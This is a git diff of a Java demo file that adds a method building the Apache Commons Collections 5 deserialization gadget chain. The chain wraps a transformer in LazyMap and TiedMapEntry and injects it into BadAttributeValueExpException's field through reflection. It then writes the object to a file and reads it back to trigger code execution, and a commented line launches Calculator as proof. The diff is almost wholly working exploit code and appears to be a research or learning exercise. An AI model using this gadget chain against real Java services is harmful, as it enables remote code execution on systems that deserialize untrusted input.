@@ -2,14 +2,15 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.map.TransformedMap;
 
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
 import java.lang.annotation.Retention;
 import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
@@ -33,7 +34,7 @@ public class Demo {
 //        payload2File(generatePayload(), "obj");
 //        payloadTest("obj");
 //        Runtime.getRuntime().exec(new String [] { "/Applications/Calculator.app/Contents/MacOS/Calculator" });
-        exploit();
+        exploit5();
     }
 
     public static void payload2File(Object instance, String file) throws Exception {
@@ -75,5 +76,30 @@ public class Demo {
         };
         Transformer chainedTransformer = new ChainedTransformer(transformers);
         return chainedTransformer;
+    }
+
+    // Common-colletions 5
+    public static void exploit5() throws Exception {
+        Transformer chainedTransformer = generateChainedTransformer();
+        Map normalMap = new HashMap();
+        normalMap.put("hackhack", "madneal");
+        Map lazyMap = LazyMap.decorate(normalMap, chainedTransformer);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);
+        Field valField = ex.getClass().getDeclaredField("val");
+        valField.setAccessible(true);
+        valField.set(ex, entry);
+
+        File f = new File("obj5");
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
+        out.writeObject(ex);
+        out.flush();
+        out.close();
+
+        ObjectInputStream in = new ObjectInputStream(new FileInputStream(f));
+        in.readObject();
+
+
     }
 }
